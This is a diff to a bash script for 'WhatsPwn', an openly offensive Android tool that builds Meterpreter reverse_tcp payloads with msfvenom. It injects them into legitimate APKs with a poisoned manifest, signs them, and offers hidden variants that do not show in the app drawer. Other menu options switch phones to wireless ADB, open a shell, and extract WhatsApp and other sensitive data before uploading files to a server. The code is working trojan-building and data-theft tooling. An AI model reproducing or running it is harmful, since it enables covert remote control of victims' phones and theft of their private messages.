@@ -32,6 +32,7 @@ CYAN='\033[0;36m'
 # EXIT TRAP CTRL + C
 EXITCODE() {
 	${WDIR}/bin/adb kill-server
+	rm -r ${WDIR}/tmp/
 	clear
 	exit
 }
@@ -68,7 +69,7 @@ CHKAUTO() {
 # ERROR IN CONNECTION
 FAIL_MSG(){
 	echo -e "\n${RED}YOU ARE NOT CONNECTED${NONE}" && echo -e -n "\nPress any key to continue ..." && read -n 1
-	MAIN_INTERFACE
+	ATTACKS_INTERFACE
 }
 #######################################################################################################################
 #                                                   MAIN FUNCTIONS                                                    #
@@ -90,7 +91,7 @@ FULL_ATTACK() {
 # LAUNCH SHELL
 SHELL() {
 	if [[ -n $CONNECTED ]]; then
-		${WDIR}/bin/adb shell && MAIN_INTERFACE
+		${WDIR}/bin/adb shell && ATTACKS_INTERFACE
 	else
 		FAIL_MSG
 	fi
@@ -99,7 +100,7 @@ SHELL() {
 # RESTORE WHATSAPP
 RESTORE() {
 	if [[ -n $CONNECTED ]]; then
-		${WDIR}/bin/adb install -r -d ${WDIR}bin/WhatsApp_Backup.apk && MAIN_INTERFACE
+		${WDIR}/bin/adb install -r -d ${WDIR}bin/WhatsApp_Backup.apk && ATTACKS_INTERFACE
 	else
 		FAIL_MSG
 	fi
@@ -160,7 +161,7 @@ UPLOAD() {
 		fi
 	fi
 	if [[ $USEINTERFACE == "Y" ]]; then
-			MAIN_INTERFACE
+			ATTACKS_INTERFACE
 		else
 			exit 0
 	fi
@@ -168,6 +169,10 @@ UPLOAD() {
 
 # INJECT METERPRETER INTO LEGITIMATE APK
 INJECTION(){
+if [[ -z $LEGITIMATE_APK ]]; then
+	echo -e -n "${CYAN}WP${NONE}> ${BOLD}ENTER THE LEGITIMATE APK TO USE WITH FULL PATH: ${NONE}"
+	read LEGITIMATE_APK
+fi
 	/usr/bin/env ruby <<-EORUBY
 require 'nokogiri'
 require 'fileutils'
@@ -329,9 +334,9 @@ print "[*] POISONING THE MANIFEST WITH METERPRETER PERMISSIONS ...\n"
 IMPORT_PERMISSIONS()
 
 print "[*] REBUILDING #{LEGITIMATE_APK} WITH METERPRETER INJECTION AS #{injected_apk} ...\n"
-`apktool b -o $WDIR/bin/Payloads/#{injected_apk} $WDIR/tmp/Legitimate`
+`apktool b -f -o $WDIR/bin/Payloads/#{injected_apk} $WDIR/tmp/Legitimate`
 print "[*] SIGNING #{injected_apk} ...\n"
-`java -jar $WDIR/bin/signapk.jar testkey.x509.pem testkey.pk8 $WDIR/bin/Payloads/#{injected_apk} $WDIR/bin/Payloads/Signed/#{injected_apk}`
+`java -jar $WDIR/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 $WDIR/bin/Payloads/#{injected_apk} $WDIR/bin/Payloads/Signed/#{injected_apk}`
 
 puts "[+] INFECTED FILE $WDIR/bin/Payloads/Signed/#{injected_apk} READY.\n"
 EORUBY
@@ -342,12 +347,18 @@ EORUBY
 
 # VISIBLE
 VISIBLE() {
-	echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO [${CYAN}${SERV}${NONE}${BOLD}]: ${NONE}"
-	read PAYLOAD_IP
-	echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT [${CYAN}${PAYLOAD_PORT}${NONE}${BOLD}]: ${NONE}"
-	read PAYLOAD_PORT
-	echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD -WITHOUT .APK- [${CYAN}${PAYLOAD_NAME}${NONE}${BOLD}]: ${NONE}"
-	read PAYLOAD_NAME
+	if [[ -z $PAYLOAD_IP ]]; then
+		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO [${CYAN}${SERV}${NONE}${BOLD}]: ${NONE}"
+		read PAYLOAD_IP
+	fi
+	if [[ -z $PAYLOAD_PORT ]]; then
+		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT [${CYAN}${PAYLOAD_PORT}${NONE}${BOLD}]: ${NONE}"
+		read PAYLOAD_PORT
+	fi
+	if [[ -z $PAYLOAD_NAME ]]; then
+		echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD -WITHOUT .APK- [${CYAN}${PAYLOAD_NAME}${NONE}${BOLD}]: ${NONE}"
+		read PAYLOAD_NAME
+	fi
 	echo -e "CREATING PAYLOAD ... [${BOLD}WAIT${NONE}]"
 	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_IP} LPORT=${PAYLOAD_PORT} R > ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk
 	java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk ${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
@@ -372,10 +383,10 @@ RELAUNCH() {
 	if [[ -z $PAYLOAD ]]; then
 		if [ `find ${WDIR}/bin/Payloads/Signed -prune -empty` ];then
 			echo -e "${RED}COULD NOT FIND ANY PAYLOAD${NONE}"
-			echo -e-n "\n${CYAN}WP${NONE}> ${BOLD}CREATE ONE NOW? [${CYAN}Y${NONE}${BOLD}/${CYAN}N${BOLD}]: ${NONE}"
+			echo -e -n "\n${CYAN}WP${NONE}> ${BOLD}CREATE ONE NOW? [${CYAN}Y${NONE}${BOLD}/${CYAN}N${NONE}${BOLD}]: ${NONE}"
 			read CREATE_PAYLOAD
 			case "$CREATE_PAYLOAD" in
-				 y|Y|YES|yes) echo -e -n "${CYAN}WP${NONE}> ${BOLD}HIDDEN OR VISIBLE? [${CYAN}H${NONE}${BOLD}/${CYAN}V${NONE}]: " && read HV
+				 y|Y|YES|yes) echo -e -n "${CYAN}WP${NONE}> ${BOLD}HIDDEN OR VISIBLE? [${CYAN}H${NONE}${BOLD}/${CYAN}V${NONE}${BOLD}]: ${NONE}" && read HV
 				case "$HV" in
 					H|h) HIDDEN && INSTALL ;;
 					v|V) VISIBLE && INSTALL ;;
@@ -384,12 +395,12 @@ RELAUNCH() {
 			esac
 		else
 			NUM_PAYLOADS=$(find ${WDIR}/bin/Payloads/Signed/ -mindepth 1 -type f -name "*.apk" -exec printf x \; | wc -c)
-			echo -e "${BOLD}FOUND ${CYAN}${NUM_PAYLOADS}${NONE}${BOLD} SIGNED PAYLOADS:${NONE}\n"
-			ls ${WDIR}/bin/Payloads/Signed/*.apk | awk -F "/" '{print $NF}'
-			echo -e -n "\n${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE ONE YOU WANT TO USE: ${NONE}"
-			read $PAYLOAD_NAME
-			PAYLOAD=${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}
+			echo -e "${BOLD}FOUND ${CYAN}${NUM_PAYLOADS}${NONE}${BOLD} SIGNED PAYLOADS:${NONE}"
+			echo -e "${CYAN}WP${NONE}> ${BOLD}ENTER THE NUMBER OF THE PAYLOAD YOU WANT TO USE:${NONE}"
+			select PAYLOAD_NAME in `ls -l ${WDIR}/bin/Payloads/Signed/*.apk | awk -F "/" '{print $NF}' | rev | cut -b 5- | rev`; do
+			PAYLOAD=${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
 			INSTALL
+			done
 		fi
 	else
 		INSTALL
@@ -400,19 +411,21 @@ RELAUNCH() {
 #######################################################################################################################
 # PAYLOAD INTERFACE
 PAYLOAD_INT() {
+	unset PAYLOAD
+	unset PAYLOAD_NAME
+	. ${WDIR}/config
 	if [[ ! -d ${WDIR}/bin/Payloads/Signed/ ]]; then
 		mkdir -p ${WDIR}/bin/Payloads/Signed/
 	fi
 	clear
 	cat ${WDIR}/bin/motd
-	echo -e "\n                                                 ${BOLD}DEVICE STATUS: ${STATUS}"
-	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?${CYAN}\n
-	1) INJECT METERPRETER PAYLOAD INTO LEGITIMATE APK
-	2) CREATE HIDDEN METERPRETER PAYLOAD [NOT VISIBLE IN DRAWER]
-	3) CREATE A VISIBLE METERPRETER PAYLOAD [VISIBLE METASPLOIT ICON]
-	4) INSTALL OR RELAUNCH PAYLOAD IN DEVICE
-	99) RETURN TO MAIN MENU
-	x) EXIT${NONE}"
+	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?\n
+	[${CYAN}1${NONE}${NONE}${BOLD}]${NONE} INJECT METERPRETER PAYLOAD INTO LEGITIMATE APK
+	${BOLD}[${CYAN}2${NONE}${NONE}${BOLD}]${NONE} CREATE HIDDEN METERPRETER PAYLOAD [NOT VISIBLE IN DRAWER]
+	${BOLD}[${CYAN}3${NONE}${NONE}${BOLD}]${NONE} CREATE A VISIBLE METERPRETER PAYLOAD [VISIBLE METASPLOIT ICON]
+	${BOLD}[${CYAN}4${NONE}${NONE}${BOLD}]${NONE} INSTALL OR RELAUNCH PAYLOAD IN DEVICE
+	${BOLD}[${CYAN}r${NONE}${NONE}${BOLD}]${NONE} RETURN TO PREVIOUS MENU
+	${BOLD}[${CYAN}x${NONE}${NONE}${BOLD}]${NONE} EXIT"
 	echo -e -n "\n${CYAN}WP${NONE}> "
 	read MENU
 	case "$MENU" in
@@ -420,40 +433,40 @@ PAYLOAD_INT() {
 		2) HIDDEN ;;
 		3) VISIBLE ;;
 		4) RELAUNCH ;;
-		99) MAIN_INTERFACE ;;
+		r|R) MAIN_INTERFACE ;;
 		x|X) exit 0 ;;
 		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && PAYLOAD_INT ;;
 	esac
 }
 #######################################################################################################################
-# MAIN INTERFACE IF -i OPTION PASSED THROUGH
+# MAIN INTERFACE
 MAIN_INTERFACE() {
 	clear
 	# LICENSE AGREEMENT PROMPT
 	while true; do
-		if grep "I accept" .LicenseAgreed; then
+		if grep "I accept" ${WDIR}/.LicenseAgreed > /dev/null; then
 			break
 		else
 			clear
-			cat << EOF > LicenseAgreement
+			cat << EOF > ${WDIR}/.LicenseAgreement
 WhatsPwn  Copyright (C) 2016  José Luis Rodríguez Fragoso
 This program comes with ABSOLUTELY NO WARRANTY; for details type 'w'.
 This is free software, and you are welcome to redistribute it
 under certain conditions; type 'c' for details.
 EOF
 			# DISPLAY LICENSE AGREEMENT PROMPT
-			cat LicenseAgreement
+			cat ${WDIR}/.LicenseAgreement
 			echo -e -n "\n${BOLD}Do you accept the rights? ${NONE}${BOLD}[Y/N/W/C]: ${NONE}"
 			read license
 		        case "$license" in
 		        	# OPTIONS AND ARGUMENTS FOR LICENSE
-		        	Y|y|yes|YES|Yes|yES|yeS|YEs|YeS) cat << EOF > .LicenseAgreed
+		        	Y|y|yes|YES|Yes|yES|yeS|YEs|YeS) cat << EOF > ${WDIR}/.LicenseAgreed
 I accept
 EOF
 					break ;;
-		        	N|n|NO|no|No|nO) echo "I do NOT accept" > .LicenseAgreed && exit ;;
+		        	N|n|NO|no|No|nO) echo "I do NOT accept" > ${WDIR}/.LicenseAgreed && exit ;;
 					# WARRANTY W OPTION
-		        	W|w) echo -e "\n" && cat << EOF > LicenseAgreement
+		        	W|w) echo -e "\n" && cat << EOF > ${WDIR}/.LicenseAgreement
 THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
 APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
 HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
@@ -463,9 +476,9 @@ PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
 IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
 ALL NECESSARY SERVICING, REPAIR OR CORRECTION.
 EOF
-					cat LicenseAgreement && echo -e -n "\nPress any key to continue ..." && read -n 1;;
+					cat ${WDIR}/.LicenseAgreement && echo -e -n "\nPress any key to continue ..." && read -n 1;;
 				# FULL LICENSE C OPTION [CONDITIONS]
-				C|c) cat LICENSE | less && echo -e -n "\nPress any key to continue ..." && read -n 1;;
+				C|c) cat ${WDIR}/LICENSE | less && echo -e -n "\nPress any key to continue ..." && read -n 1;;
 				esac
 		fi
 	done
@@ -474,26 +487,93 @@ EOF
 # INTERFACE INIT
 	clear
 	cat ${WDIR}/bin/motd
+	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?\n
+	[${CYAN}1${NONE}${NONE}${NONE}${BOLD}]${NONE} ATTACKS
+	${BOLD}[${CYAN}2${NONE}${NONE}${BOLD}]${NONE} PAYLOADS
+	${BOLD}[${CYAN}3${NONE}${NONE}${BOLD}]${NONE} UPLOAD FILES TO SERVER
+	${BOLD}[${CYAN}x${NONE}${NONE}${BOLD}]${NONE} EXIT"
+	echo -e -n "\n${CYAN}WP${NONE}> "
+	read MENU
+	case "$MENU" in
+		1) ATTACKS_INTERFACE ;;
+		2) PAYLOAD_INT ;;
+		3) UPLOAD ;;
+		x|X) exit 0 ;;
+		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && MAIN_INTERFACE ;;
+	esac
+}
+#######################################################################################################################
+# MAIN ATTACKS INTERFACE
+ATTACKS_INTERFACE() {
+	# ATTEMPT CONNECTION TO DEVICE IN BACKGROUND
+	while true; do
+		# CHECK IF DEVICE IS NOT CONNECTED AND WAITS FOR IT
+		if [[ ! -f ${WDIR}/tmp/ADB_Devices ]]; then
+				echo -e "${BOLD}CONNECT THE DEVICE${NONE}\n"
+				${WDIR}/bin/adb start-server > /dev/null
+				${WDIR}/bin/adb wait-for-device > /dev/null
+		fi
+		# EXPORT RESULT OF 'adb devices' COMMAND TO A FILE
+		${WDIR}/bin/adb devices > ${WDIR}/tmp/ADB_Devices
+		# IF THE FILE CONTAINS AN IP, SET IT AS VARIABLE
+		IP=$(grep -oE "[0-9]{1,3}(\.[0-9]{1,3}){3}" ${WDIR}/tmp/ADB_Devices)
+		# IF IP VARIABLE IS SET THEN IT IS CONNECTED WIRELESSLY
+		if [[ -n "$IP" ]]; then
+			CONNECTED=1
+			STATUS="${GREEN}CONNECTED${NONE} IP = [${CYAN}${IP}${NONE} IF YOU HAVE YOUR DEVICE CONNECTED TO CABLE, DISCONNECT IT.]"
+			# REMOVE ADB _Devices FILE TO AVOID ENTERING ABOVE IF STATEMENT
+			rm -f ${WDIR}/tmp/ADB_Devices
+			# BREAK THE CYLCE
+			break
+		else
+			# IF IP IS NOT SET, CHECK IF DEVICES IS CONNECTED LOCALLY ONLY
+			if [ `grep -oE "device" ${WDIR}/tmp/ADB_Devices` ]; then
+				# GET DEVICE IP WHILE ITS STILL CONNECTED
+				DEVICE_IP=$(${WDIR}/bin/adb shell ip -f inet addr show wlan0 | grep "inet [0-9]{1,3}(\.[0-9]{1,3}){3}" -oE | grep "[0-9]{1,3}(\.[0-9]{1,3}){3}" -oE)
+				# ATTEMPT TO CONNECT WIRELESSLY
+				${WDIR}/bin/adb tcpip 5555
+				# ATTEMPT WIRELESS CONNECTION IF NOT CONNECTED
+				if [ ! `${WDIR}/bin/adb connect ${DEVICE_IP}:5555 | grep "connected to ${DEVICE_IP}" -oE` ]; then
+					# IF NOT CHECK IF IT IS STILL CONNECTED TO USB
+					if [ `${WDIR}/bin/adb devices | grep "device" -oE` ]; then
+						# IF IT IS, DISPLAY CONNECTED LOCALLY
+						CONNECTED=1
+						STATUS="${GREEN}CONNECTED ${CYAN}LOCALLY"
+						# REMOVE ADB DEVICES FILE
+						rm -f ${WDIR}/tmp/ADB_Devices
+						# BREAK THE CYCLE
+						break
+					else
+						# IF IT IS NOT CONNECTED TO USB SET DISCONNECTED, REMOVE ADB FILE AND CLEAR VARIABLE BUT DO NOT BREAK CYCLE TO KEEP ATTEMPTING CONNECTING
+						unset CONNECTED
+						STATUS="${RED}DISCONNECTED${NONE}"
+						rm -f ${WDIR}/tmp/ADB_Devices
+					fi
+				fi
+			fi
+		fi
+	done
+	# INTERFACE INIT
+	#clear
+	cat ${WDIR}/bin/motd
 	echo -e "\n                                                 DEVICE STATUS: ${STATUS}"
-	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?${CYAN}\n
-	1) START FULL ATTACK
-	2) LAUNCH SHELL
-	3) EMERGENCY RESTORE WHATSAPP
-	4) JUST RUN EXTRACTION
-	5) UPLOAD FILES TO SERVER
-	6) PAYLOAD
-	x) EXIT${NONE}"
+	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?\n
+	[${CYAN}1${NONE}${NONE}${NONE}${BOLD}]${NONE} FULL ATTACK
+	${BOLD}[${CYAN}2${NONE}${NONE}${BOLD}]${NONE} LAUNCH SHELL
+	${BOLD}[${CYAN}3${NONE}${NONE}${BOLD}]${NONE} EMERGENCY RESTORE WHATSAPP
+	${BOLD}[${CYAN}4${NONE}${NONE}${BOLD}]${NONE} ONLY EXTRACT SENSITIVE DATA
+	${BOLD}[${CYAN}4${NONE}${NONE}${BOLD}]${NONE} RETURN TO MAIN MENU
+	${BOLD}[${CYAN}x${NONE}${NONE}${BOLD}]${NONE} EXIT"
 	echo -e -n "\n${CYAN}WP${NONE}> "
 	read MENU
 	case "$MENU" in
 		1) CHKAUTO && FULL_ATTACK ;;
-		2) SHELL && MAIN_INTERFACE ;;
+		2) SHELL && ATTACKS_INTERFACE ;;
 		3) RESTORE ;;
 		4) CHKAUTO && EXTRACTION ;;
-		5) UPLOAD ;;
-		6) PAYLOAD_INT ;;
+		r|R) MAIN_INTERFACE ;;
 		x|X) exit 0 ;;
-		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && MAIN_INTERFACE ;;
+		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && ATTACKS_INTERFACE ;;
 	esac
 }
 #######################################################################################################################
@@ -565,55 +645,6 @@ fi
 
 # CREATE TEMPORARY DIRECTORY
 mkdir -p ${WDIR}/tmp/
-
-# ATTEMPT CONNECTION TO DEVICE IN BACKGROUND
-#while true; do
-#	# CHECK IF DEVICE IS NOT CONNECTED AND WAITS FOR IT
-#	if [[ ! -f ${WDIR}/tmp/ADB_Devices ]]; then
-#			echo -e "${BOLD}CONNECT THE DEVICE${NONE}\n"
-#			${WDIR}/bin/adb start-server > /dev/null
-#			${WDIR}/bin/adb wait-for-device > /dev/null
-#	fi
-#	# EXPORT RESULT OF 'adb devices' COMMAND TO A FILE
-#	${WDIR}/bin/adb devices > ${WDIR}/tmp/ADB_Devices
-#	# IF THE FILE CONTAINS AN IP, SET IT AS VARIABLE
-#	IP=$(grep -oE "[0-9]{1,3}(\.[0-9]{1,3}){3}" ${WDIR}/tmp/ADB_Devices)
-#	# IF IP VARIABLE IS SET THEN IT IS CONNECTED WIRELESSLY
-#	if [[ -n "$IP" ]]; then
-#		CONNECTED=1
-#		STATUS="${GREEN}CONNECTED${NONE} IP = [${CYAN}${IP}${NONE} IF YOU HAVE YOUR DEVICE CONNECTED TO CABLE, DISCONNECT IT.]"
-#		# REMOVE ADB _Devices FILE TO AVOID ENTERING ABOVE IF STATEMENT
-#		rm -f ${WDIR}/tmp/ADB_Devices
-#		# BREAK THE CYLCE
-#		break
-#	else
-#		# IF IP IS NOT SET, CHECK IF DEVICES IS CONNECTED LOCALLY ONLY
-#		if [ `grep -oE "device" ${WDIR}/tmp/ADB_Devices` ]; then
-#			# GET DEVICE IP WHILE ITS STILL CONNECTED
-#			DEVICE_IP=$(${WDIR}/bin/adb shell ip -f inet addr show wlan0 | grep "inet [0-9]{1,3}(\.[0-9]{1,3}){3}" -oE | grep "[0-9]{1,3}(\.[0-9]{1,3}){3}" -oE)
-#			# ATTEMPT TO CONNECT WIRELESSLY
-#			${WDIR}/bin/adb tcpip 5555
-#			# ATTEMPT WIRELESS CONNECTION IF NOT CONNECTED
-#			if [ ! `${WDIR}/bin/adb connect ${DEVICE_IP}:5555 | grep "connected to ${DEVICE_IP}" -oE` ]; then
-#				# IF NOT CHECK IF IT IS STILL CONNECTED TO USB
-#				if [ `${WDIR}/bin/adb devices | grep "device" -oE` ]; then
-#					# IF IT IS, DISPLAY CONNECTED LOCALLY
-#					CONNECTED=1
-#					STATUS="${GREEN}CONNECTED ${CYAN}LOCALLY"
-#					# REMOVE ADB DEVICES FILE
-#					rm -f ${WDIR}/tmp/ADB_Devices
-#					# BREAK THE CYCLE
-#					break
-#				else
-#					# IF IT IS NOT CONNECTED TO USB SET DISCONNECTED, REMOVE ADB FILE AND CLEAR VARIABLE BUT DO NOT BREAK CYCLE TO KEEP ATTEMPTING CONNECTING
-#					unset CONNECTED
-#					STATUS="${RED}DISCONNECTED${NONE}"
-#					rm -f ${WDIR}/tmp/ADB_Devices
-#				fi
-#			fi
-#		fi
-#	fi
-#done
 #######################################################################################################################
 #                                                  ARGUMENT PARSER                                                    #
 #######################################################################################################################
